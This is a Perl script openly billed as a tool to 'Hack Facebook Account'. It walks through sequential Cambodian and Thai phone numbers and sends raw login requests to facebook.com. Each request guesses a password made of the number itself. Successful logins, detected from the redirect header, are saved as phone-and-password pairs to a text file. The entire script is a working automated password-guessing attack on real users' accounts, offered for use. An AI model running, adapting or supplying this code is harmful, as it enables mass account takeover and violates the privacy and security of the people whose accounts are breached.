use strict;
use Net::SSLeay::Handle;
use HTTP::Cookies;
system "color a";

print "\n\n Welcome To Hack Facebook Account By SotheaPov :D \n\n";
print "\n\n 1:097 2:069 3:010 4:093 5:098 6:087 7:088 8:015 9:015 \n\n";

print "\n\n Phone Choosing By Above:";
my $step0 = <STDIN>;
chomp $step0;

my $countryphone = "";
my $phonehead = "";
if($step0==1){
$countryphone = "+85597";
$phonehead = "097";
}
if($step0==2){
$countryphone = "+85569";
$phonehead = "069";
}
if($step0==3){
$countryphone = "+6683";
$phonehead = "083";
}
if($step0==4){
$countryphone = "+85593";
$phonehead = "093";
}
if($step0==5){
$countryphone = "+85598";
$phonehead = "098";
}
if($step0==6){
$countryphone = "+85587";
$phonehead = "087";
}
if($step0==7){
$countryphone = "+85588";
$phonehead = "088";
}
if($step0==8){
$countryphone = "+85515";
$phonehead = "015";
}
if($step0==9){
$countryphone = "+6683";
$phonehead = "083";
}
print "\n\n Enter How many account you want to hack? :";
my $step1 = <STDIN>;
chomp $step1;

print "\n\n Enter start number : $countryphone";
my $numberphone = <STDIN>;
chomp $numberphone; 
print "\n\n Hacked account will save to $numberphone.txt \n\n";

my $files = "$numberphone.txt";
unlink ($files);

my $hackban = 0;

print "\n\n Hacking... \n\n\n";

while ($numberphone < 999999999) {
	$numberphone++;
my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$countryphone$numberphone&pass=$phonehead$numberphone&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success; 
while(my $result = <SSL>)
{
	open (OUTFILE, ">>result.txt");
	print OUTFILE "$result\n";
	close(OUTFILE); 
	if($result =~ /Location(.*?)/){
		if($result !~ /checkpoint(.*?)/){
			$success = $1;	
		}else{
			print "Blocked\n";
		}
			 
	}
}
	if (!defined $success)
	{
		print "[-] $countryphone$numberphone \n";
		close SSL;
	}
	else{ 
		print "[+] $countryphone$numberphone = Hacked! \n";
		$hackban++;
		open(OUTFILE, ">>$files");
		print OUTFILE "$countryphone$numberphone $phonehead$numberphone\n";
		close(OUTFILE);
		close SSL;
		#finished hacked
		if($hackban >= $step1){
			print	"\n\n Hacking Finish. \n\n";
			exit;
		}
	}
}